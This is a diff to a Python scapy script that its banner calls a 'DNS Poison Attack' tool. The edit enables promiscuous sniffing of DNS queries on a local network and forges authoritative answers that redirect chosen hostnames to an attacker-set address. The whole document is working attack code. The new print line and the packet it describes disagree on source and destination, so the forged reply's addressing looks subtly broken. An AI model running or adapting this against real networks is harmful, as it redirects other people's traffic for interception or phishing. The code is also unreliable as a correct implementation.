@@ -6,8 +6,13 @@ import netifaces
 from scapy.all import send
 from scapy.layers.dns import DNSQR, DNS, IP, UDP, DNSRR
 from scapy.all import sniff
+from scapy.all import *
+# from scapy.interfaces import show_interfaces, get_if_list
 
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
+
+# Ser Promiscuous Mode, so we can sniff other DNS packets in LAN!
+conf.sniff_promisc=1
 
 
 # Get IP address
@@ -25,6 +30,9 @@ def injector(pkt):
     redirect_dst = ""
     if pkt.haslayer(IP) and pkt.haslayer(DNSQR) and pkt[DNS].qr == 0:
         affectedHost = pkt[DNSQR].qname
+
+        # print("IP src:", pkt[IP].src, " | IP dst:", pkt[IP].dst)
+        # print(affectedHost)
 
         if options.hostnames is not None:
             affectedHost = str(affectedHost, encoding="utf-8").rstrip(".")
@@ -44,13 +52,13 @@ def injector(pkt):
             print(" ")
             print("Packet has UDP layer!")
             print("-------------- Spoofing Pkt Info -----------------")
-            print("IP src:", pkt[IP].src, " | IP dst:", redirect_dst)
+            print("IP src:", pkt[IP].dst, " | IP dst:", pkt[IP].src)
             print("UDP sport:", pkt[UDP].sport, " | UDP dport:", pkt[UDP].dport)
             print("DNS id:", pkt[DNS].id, " | DNS rdata:", redirect_dst)
             print("--------------------- End ------------------------")
             print(" ")
 
-            spoofed_pkt = IP(dst=redirect_dst, src=pkt[IP].src) / \
+            spoofed_pkt = IP(dst=pkt[IP].dst, src=pkt[IP].src) / \
                           UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
                           DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, qr=1,
                               an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=redirect_dst))
@@ -105,5 +113,8 @@ if __name__ == '__main__':
     print("#                  Begin Preparing for DNS Poison Attack                       #")
     print("################################################################################")
     print(" ")
+
+    # show_interfaces()
+    # get_if_list()
 
     sniff(filter=exp, prn=injector, store=0, iface=options.interface)
